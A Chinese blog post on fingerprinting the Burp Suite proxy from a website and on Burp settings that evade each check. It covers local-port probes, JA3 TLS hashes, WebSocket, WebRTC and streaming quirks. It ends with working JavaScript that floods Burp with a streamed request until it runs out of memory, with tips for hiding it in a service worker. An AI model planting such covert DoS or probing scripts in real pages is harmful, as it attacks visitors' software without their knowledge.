---
title: "Burpsuite 特征识别及其对抗措施"
date: 2022-08-14T12:26:13+08:00
tags: [misc]
---

某日, 我的同学突然 @crane 问我有没有能检测 burp 的方法. 突然想起来之前就遇到过, 当时是一个在 MacOS 上运行 burp 的同学被拦截了, 但是我的 burp 却没有被拦截, 于是就没有太在意. 现在回想起来有点在意为什么, 学习一下相关方法.

<!--more-->

让我们首先看看网络上已有的检测 burp 的方法

## burp web interface

burp web interface, 也就是直接访问 burp 代理端口, 或者在经过 burp 代理的情况下访问 http://burp 和 http://burpsuite 出来的页面. 主要作用是... 好像也没啥作用? 在老版本貌似可以下载 pac 代理文件, 但目前实际上能用的功能也就一个导出证书了, 但是导出证书完全可以在 burp 里完成, 导致这个 interface 其实有点鸡肋. 但是这个 interface 存在一个 favicon, 导致可以轻松使用 img 的 onerror 和 onload 来判断是否存在 burp.

```html
<h2 id='indicator'>Loading...</h2>
<script>
    function burp_found() {
        let e = document.getElementById('indicator');
        e.innerText = 'Burp FOUND !!!';
    }
    
    function burp_not_found() {
        let e = document.getElementById('indicator');
        e.innerText = 'Burp not found.';
    }
</script>
<img style="display: none;" src='http://burp/favicon.ico' onload='burp_found()' onerror='burp_not_found()'/>
```
当然这个检测方式存在一个致命缺点 = =, 就是攻击者得开全局代理, 否则不通过 burp 的代理请求 burp 这个域名, 当然是不存在的. 这个完全看个人喜好了, 不过至少我从来不开全局代理... 都是将目标域名在 SwitchyOmega 的选项里特定走 burp 代理.

当然, 也完全可以直接请求 burp 默认的代理端口 `http://127.0.0.1:8080/favicon.ico`, 这样不管开不开全局代理都无所谓了, 不过这样也有可能误判, 比如 tomcat 默认也是 8080 端口. 为了提高可信度, 我们可以利用上面提到的 burp 仅剩的导出证书的接口, 利用 script 探测是 404 还是 200. 非常滑稽的是 burp 还是做了不少防御的, 包括 `X-Frame-Options` 和 `X-Content-Type-Options`, 但是这个接口一个都没有上, 否则也是利用不了的.
```html
<h2 id='indicator'>Loading...</h2>
<script>
    function burp_found() {
        let e = document.getElementById('indicator');
        e.innerText = 'Burp FOUND !!!';
    }
    
    function burp_not_found() {
        let e = document.getElementById('indicator');
        e.innerText = 'Burp not found.';
    }
</script>
<script style="display: none;" src='http://127.0.0.1:8080/cert' onload='burp_found()' onerror='burp_not_found()'></script>
```

对抗这种探测非常简单, 在 `Proxy -> Miscellaneous` 里面勾选 `Disable web interface at http://burpsuite` 和 `Suppress Burp error messages in browser` 即可. 需要注意 `Suppress Burp error messages in browser` 也要勾选, 否则在全局代理模式下, 访问一个不存在的域名, burp 会返回一个 HTTP 200 的错误页面, 非常好探测.

![](https://s2.loli.net/2022/08/15/QtsnRd8kXzfU7uO.png#center)

```html
<h2 id='indicator'>Loading...</h2>
<script>
    function burp_found() {
        let e = document.getElementById('indicator');
        e.innerText = 'Burp FOUND !!!';
    }
    
    function burp_not_found() {
        is_burp_not_found = true;
        let e = document.getElementById('indicator');
        e.innerText = 'Burp not found.';
    }
</script>
<script>
    fetch('http://not_exists_domain/not_exist', {method: 'GET', mode: 'no-cors'}).then((r)=>{burp_found();}).catch((e)=>{burp_not_found();});
    // 200 -> fetch 成功, 触发 then, burp 存在. 超时 -> fetch 失败, 触发 catch, burp 不存在.
</script>
```

## TLS fingerprint

最经典的探测方法了应该是, 也就是最常见的开源实现就是 [ja3](https://github.com/salesforce/ja3), 其实 ja3 说起来也十分简单, 就是把 TLS 握手时客户端发送的 Client Hello 里面的 Version + Cipher Suites + Extensions 提取出来然后算个 md5.

![](https://s2.loli.net/2022/08/15/vAMdWk9C1TsZcx7.png#center "TLS Version + Cipher Suites")
![](https://s2.loli.net/2022/08/15/MbuGa9XBTfrk7AQ.png#center "Extensions")
![](https://s2.loli.net/2022/08/15/4HVOUgmFe3cR7ua.png#center "对 0x0a 0x0b 这两个 Extensions, 会额外提取里面的参数")

由于不同软件底层使用的 TLS 库不同, 比如: ja3 是顺序敏感的, GnuTLS, OpenSSL, NSS 之间可能会将 Cipher Suites 放在不同的位置, 就算使用完全相同的配置也会导致 ja3 指纹的不同. 更别说软件一般配置的算法都不会完全一样, 导致可以利用 ja3 特征识别客户端. 以下是一些例子:  

> chrome104.pcap
> ```
> $ ./python/venv/bin/python python/ja3.py chrome104.pcap | grep 61.183.52.197
> [61.183.52.197:443] JA3: 771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0 --> cd08e31494f9531f560d64c695473da9
> [61.183.52.197:443] JA3: 771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21-41,29-23-24,0 --> 0d69ff451640d67ee8b5122752834766
> [61.183.52.197:443] JA3: 771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21-41,29-23-24,0 --> 0d69ff451640d67ee8b5122752834766
> ```

>  burp2022.8.1-java11.pcap
> ```
> $ ./python/venv/bin/python python/ja3.py burp2022.8.1-java11.pcap | grep 61.183.52.197
> [61.183.52.197:443] JA3: 771,4866-4865-4867-49196-49195-52393-49200-52392-49199-159-52394-163-158-162-49188-49192-49187-49191-107-106-103-64-49198-49202-49197-49201-49190-49194-49189-49193-49162-49172-49161-49171-57-56-51-50-49157-49167-49156-49166-157-156-61-60-53-47-255,0-5-10-11-13-50-16-17-23-43-45-51,29-23-24-25-30-256-257-258-259-260,0 --> b154bc0fc6157d34cb12295edb07a2f6
> [61.183.52.197:443] JA3: 771,4866-4865-4867-49196-49195-52393-49200-52392-49199-159-52394-163-158-162-49188-49192-49187-49191-107-106-103-64-49198-49202-49197-49201-49190-49194-49189-49193-49162-49172-49161-49171-57-56-51-50-49157-49167-49156-49166-157-156-61-60-53-47-255,0-5-10-11-13-50-17-23-43-45-51-41,29-23-24-25-30-256-257-258-259-260,0 --> 41cb1a264f27be250a6575f4c9aba2f1
> [61.183.52.197:443] JA3: 771,4866-4865-4867-49196-49195-52393-49200-52392-49199-159-52394-163-158-162-49188-49192-49187-49191-107-106-103-64-49198-49202-49197-49201-49190-49194-49189-49193-49162-49172-49161-49171-57-56-51-50-49157-49167-49156-49166-157-156-61-60-53-47-255,0-5-10-11-13-50-17-23-43-45-51-41,29-23-24-25-30-256-257-258-259-260,0 --> 41cb1a264f27be250a6575f4c9aba2f1
> ```

通过 burp 和 chrome 的对比可以看出不同软件之间 ja3 差别还是非常大的

> burp2022.3.9-java11.pcap
> ```
> $ ./python/venv/bin/python python/ja3.py burp2022.3.9-java11.pcap | grep 61.183.52.197
> [61.183.52.197:443] JA3: 771,4866-4865-4867-49196-49195-52393-49200-52392-49199-159-52394-163-158-162-49188-49192-49187-49191-107-106-103-64-49198-49202-49197-49201-49190-49194-49189-49193-49162-49172-49161-49171-57-56-51-50-49157-49167-49156-49166-157-156-61-60-53-47-255,0-5-10-11-13-50-16-17-23-43-45-51,29-23-24-25-30-256-257-258-259-260,0 --> b154bc0fc6157d34cb12295edb07a2f6
> [61.183.52.197:443] JA3: 771,4866-4865-4867-49196-49195-52393-49200-52392-49199-159-52394-163-158-162-49188-49192-49187-49191-107-106-103-64-49198-49202-49197-49201-49190-49194-49189-49193-49162-49172-49161-49171-57-56-51-50-49157-49167-49156-49166-157-156-61-60-53-47-255,0-5-10-11-13-50-16-17-23-43-45-51,29-23-24-25-30-256-257-258-259-260,0 --> b154bc0fc6157d34cb12295edb07a2f6
> [61.183.52.197:443] JA3: 771,4866-4865-4867-49196-49195-52393-49200-52392-49199-159-52394-163-158-162-49188-49192-49187-49191-107-106-103-64-49198-49202-49197-49201-49190-49194-49189-49193-49162-49172-49161-49171-57-56-51-50-49157-49167-49156-49166-157-156-61-60-53-47-255,0-5-10-11-13-50-17-23-43-45-51,29-23-24-25-30-256-257-258-259-260,0 --> 2c7b42976f538f0759bad05220ba8e2d
> ```

burp 之间的版本只要不是差的很多, 应该是不会有啥差别的, 差的那几个查了一下应该是 tls1.3 为了加速握手速度搞的扩展, 所以连接之间会有小差别.

> burp2022.3.9-java18.pcap
> ```
> $ ./python/venv/bin/python python/ja3.py burp2022.3.9-java18.pcap | grep 61.183.52.197
> [61.183.52.197:443] JA3: 771,4866-4865-4867-49196-49195-52393-49200-52392-49199-159-52394-163-158-162-49188-49192-49187-49191-107-106-103-64-49198-49202-49197-49201-49190-49194-49189-49193-49162-49172-49161-49171-57-56-51-50-49157-49167-49156-49166-157-156-61-60-53-47-255,0-5-10-11-16-17-23-35-13-43-45-50-51,29-23-24-25-30-256-257-258-259-260,0 --> 62f6a6727fda5a1104d5b147cd82e520
> [61.183.52.197:443] JA3: 771,4866-4865-4867-49196-49195-52393-49200-52392-49199-159-52394-163-158-162-49188-49192-49187-49191-107-106-103-64-49198-49202-49197-49201-49190-49194-49189-49193-49162-49172-49161-49171-57-56-51-50-49157-49167-49156-49166-157-156-61-60-53-47-255,0-5-10-11-16-17-23-35-13-43-45-50-51,29-23-24-25-30-256-257-258-259-260,0 --> 62f6a6727fda5a1104d5b147cd82e520
> [61.183.52.197:443] JA3: 771,4866-4865-4867-49196-49195-52393-49200-52392-49199-159-52394-163-158-162-49188-49192-49187-49191-107-106-103-64-49198-49202-49197-49201-49190-49194-49189-49193-49162-49172-49161-49171-57-56-51-50-49157-49167-49156-49166-157-156-61-60-53-47-255,0-5-10-11-17-23-13-43-45-50-51,29-23-24-25-30-256-257-258-259-260,0 --> 45d5544dca9ff99d72d13a58fe4e3ca1
> ```

真正差别大的其实是运行 burp 的 java 版本, 可以看到 extensions 部分不管是顺序还是种类都有变化.  
要对付 ja3 也非常简单, 其实 burp 已经有选项可以自定义 TLS 连接时所用的 Cipher Suites 了, 默认是使用 Java 的所有 Cipher Suites, 所以会有比较强的特征... 也是为了保证至少测试的站打的开吧, 只要随机选择几个增加或者删掉即可.  
![](https://s2.loli.net/2022/08/15/O86J7vW1XQ2krAY.png#center)

这里随便删掉了几个后的结果如下, 可以看到长度瞬间短了不少, 点的越多变化越大.

> burp2022.3.9-java18-custom-cipher.pcap
> ```
> $ ./python/venv/bin/python python/ja3.py burp2022.3.9-java18-custom-cipher.pcap | grep 61.183.52.197
> [61.183.52.197:443] JA3: 771,4866-4867-49196-49195-52393-49200-52392-49199-159-52394-163-158-162-49188-49192-49187-49191-107-106-103-64-49198-49202-49197-49190-49194-49189-49193-49162-49172-49161-49171-57-56-51-50-49157-49167-49166-157-156-61-53-47-255,0-5-10-11-17-23-35-13-43-45-50-51,29-23-24-25-30-256-257-258-259-260,0 --> 67a83bc49faeb2499fb8c8526d432076
> [61.183.52.197:443] JA3: 771,4866-4867-49196-49195-52393-49200-52392-49199-159-52394-163-158-162-49188-49192-49187-49191-107-106-103-64-49198-49202-49197-49190-49194-49189-49193-49162-49172-49161-49171-57-56-51-50-49157-49167-49166-157-156-61-53-47-255,0-5-10-11-17-23-35-13-43-45-50-51,29-23-24-25-30-256-257-258-259-260,0 --> 67a83bc49faeb2499fb8c8526d432076
> [61.183.52.197:443] JA3: 771,4866-4867-49196-49195-52393-49200-52392-49199-159-52394-163-158-162-49188-49192-49187-49191-107-106-103-64-49198-49202-49197-49190-49194-49189-49193-49162-49172-49161-49171-57-56-51-50-49157-49167-49166-157-156-61-53-47-255,0-5-10-11-17-23-35-13-43-45-50-51,29-23-24-25-30-256-257-258-259-260,0 --> 67a83bc49faeb2499fb8c8526d432076
> ```

另外还有一个最终解决方案, 就是架一个 HTTPS MITM 代理进行套娃, 这样跟网站 TLS 握手的就是 burp 后面的 MITM 代理, 自然不会暴露 burp 的 ja3 指纹.

## websocket

接下来介绍三种我发现的同样可以探测 burp 的手段, 类似于 tls fingerprint, 主要是寻找 burp 在 MITM 时对流量产生的影响.  
第一种是 websocket, 检测方法非常简单, 就是 `new WebSocket('ws://target.com/test_burp')`, 在经过 burp 代理和直接访问的流量差别如下:    

![](https://s2.loli.net/2022/08/16/TvYpMSDkbiPuoU3.png#center)

可以看到 burp 直接吃掉了 `Sec-Websocket-Extensions` 这个 header, 只要在服务端侧检测这个 header 是否存在就可以直接判断用户是否使用 burp.   

实际上要做防御非常简单, 因为这个 header 实际上是 burp 故意吃掉的, 目的是为了[兼容性](https://portswigger.net/burp/documentation/desktop/tools/proxy/options#:~:text=Strip%20Sec%2DWebSocket,uncheck%20this%20option.), 所以只要手动关闭就好了.

![](https://s2.loli.net/2022/08/16/E3rGAgZ1R9dHIif.png#center)

## webrtc

于是跟 websocket 类似的, 还有 webrtc, 使用如下代码就可以发起 webrtc 连接
```js
var rtc = new RTCPeerConnection({
    iceServers:[{"urls":"turn:target.com:19132?transport=tcp", credential: "credential", username: "username"}]
});
rtc.createDataChannel('', { reliable: false});
rtc.createOffer(
    function (offerDesc) {
        rtc.setLocalDescription(offerDesc);
    },
    function (e) {}
);
```

在远程看起来是这样的

![](https://s2.loli.net/2022/08/16/yl3WEzcaTwnINxC.png#center)

但是在经过 burp 的情况下是直接不通的, 在 burp 的日志界面可以看到 `Unsupported or unrecognized SSL message`, 很显然 burp 只能解析正常的 HTTP 或者 HTTPS 请求, 碰到 webrtc 直接就寄了.  

![](https://s2.loli.net/2022/08/16/7xyAiIcoCbt1gRl.png#center)  

对于 webrtc 这种方式, 就没有啥好解决办法了, 毕竟是 burp 内部的问题, 在他闭源且存在强混淆的情况下是没办法修改程序的逻辑的.

## HTTP streaming

最后还有 HTTP streaming, 如果是 HTTP/2 的话协议本身就是流式传输, 不用考虑太多, 而在 HTTP/1.1 用的是绕 waf 时比较常见的 `Transfer-encoding: chunked`, 可以架设以下服务端进行测试,
```py
#!/usr/bin/env python

import asyncio
from quart import make_response, Quart, render_template, url_for, request
from datetime import datetime

app = Quart(__name__)


@app.route('/')
async def index():
    return "index"

@app.route('/test')
async def stream_time():
    async def async_generator():
        for i in range(5):
            time = datetime.now().isoformat()
            yield time.encode()
            await asyncio.sleep(1)

    return async_generator(), 200, {'X-Something': 'value'}

app.run(host='0.0.0.0', port=19132,
    certfile="fullchain.pem",
    keyfile="privkey.pem",
)
```

在客户端运行以下 js
```js
fetch('http://target.com:19132/').then(async function(response) {
  console.log(response);
  const reader = response.body.getReader();
    while (1) {
        const result = await reader.read()
        if (!result.done) {
            console.log(new TextDecoder("utf-8").decode(result.value))
        } else {
            break;
        }
    }
})
```
如果没有 burp, 那么会每秒收到一个 ping, 而如果存在 burp, 其为了方便在 proxy 里面操作和查看 history, 会把全部 chunked 接收完毕后才会发送给浏览器, 于是会在 5 秒后收到 pingpingpingpingping. 造成了可以被感知的差异.

如果是 HTTP/1.1, burp 中存在相关功能的选项, 在 `Project options -> HTTP -> Streaming Response` 中 add 相关目标即可, 如果想要匹配全部, 可以打开 advanced scope control 然后写上三个 .* 就行了.  

![](https://s2.loli.net/2022/08/16/4aYGEngHdfezVj3.png#center)  

打开以后是会实时更新 history 并中继给客户端, 而不是等服务器发送完毕后才一起发送. 不过这个功能默认不开启, 尝试了以下会如同其描述所说, 在 /tmp 底下写一些文件, linux 是内存盘倒还还好, 如果是 windows 的话应该就直接写到硬盘上了吧, 没有相关需求还是别开了.

然后在 HTTP/2 的情况下, 我还发现即使打开 `Streaming Response`, burp 也无法正常处理, 还是得等流全部结束后才会返回给客户端, 所以这个选项作用还是很有限的.

## DoS

上面已经提到了 HTTP streaming, 实际上请求也是可以 streaming 的, 可以参考 [request streaming](https://developer.chrome.com/articles/fetch-streaming-requests/). 这是一个非常新的功能, 在文章写下的时间 (2022 年 8 月 14 日), 正式版 Chrome 还不支持此功能, 需要使用 Dev 版本. 需要注意请求 streaming 不支持 HTTP/1.x, 也就是说用的不是 `Transfer-encoding: chunked` 而是基于 HTTP/2 自带的流式传输.  

那么自然也是可以用来探测 burp 的, 这里不多赘述了, 有个更有意思的玩法, 那就是利用 burp 会等到请求流结束后才会发送给客户端的特性, 我们完全可以利用请求流的特点 DoS burp, 不断发送垃圾数据让 burp OOM. 而以往没有流式传输的情况, 需要在浏览器端构造超大字符串发送给 burp, 不管是死循环发送少部分, 还是一次性发送完, 首先 OOM 的都会是浏览器而不是 burp, 受害者也会非常快的发现. 而在有流式传输的情况下, 占用浏览器资源远小于 burp, 让 DoS 变的有实际意义.

比如以下代码:  
```js
let veryLoooooongString = 'abcdddddd'.repeat(6553500);
const stream = new ReadableStream({
  async start(controller) {
    while (1) {
        controller.enqueue(veryLoooooongString);
    }
  },
}).pipeThrough(new TextEncoderStream());

function wait(milliseconds) {
  return new Promise(resolve => setTimeout(resolve, milliseconds));
}

fetch('https://target.com/', {
  method: 'POST',
  headers: {'Content-Type': 'text/plain'},
  body: stream,
  duplex: 'half',
});
```

可以达到的效果如下:  
![](https://s2.loli.net/2022/08/16/JleN4U1pB9ofROK.gif "GIF 未经加速")

大概 20 多秒就可以直接把内存打满, burp 会直接卡的动不了. 如果把 wait 等待时间调长那么会更隐蔽, 更极限一点可以注册成 serviceWorker 放在后台偷偷恶心攻击者.
